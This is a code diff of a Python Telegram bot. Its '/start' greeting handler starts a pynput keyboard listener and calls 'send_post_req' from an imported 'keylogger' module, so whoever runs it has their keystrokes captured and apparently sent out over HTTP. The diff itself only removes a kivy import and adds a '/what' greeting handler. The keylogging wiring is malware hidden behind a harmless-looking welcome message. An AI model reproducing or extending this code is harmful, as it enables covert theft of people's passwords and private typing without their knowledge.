@@ -6,7 +6,7 @@ from pynput import keyboard
 import requests
 import json
 from keylogger import send_post_req, on_press
-import kivy
+
 
 text = ""
 
@@ -21,15 +21,16 @@ dp = Dispatcher()
 
 @dp.message(F.text == "/start")
 async def start(messege : Message):
-    messege.answer(f"Hello {messege.from_user.full_name},  and Welcome to the wonder land. {kivy.args}")
+    messege.answer(f"Hello {messege.from_user.full_name},  and Welcome to the wonder land")
     print("App is running")
     with keyboard.Listener(
     on_press=on_press) as listener:
         send_post_req()
         listener.join()
 
-
-
+@dp.message(F.text == "/what")
+async def start(messege : Message):
+     messege.answer(f"Hello {messege.from_user.full_name},  and Welcome to the wonder land.")
 
 @dp.message(F.text == "key")
 async def keyy(message:Message):
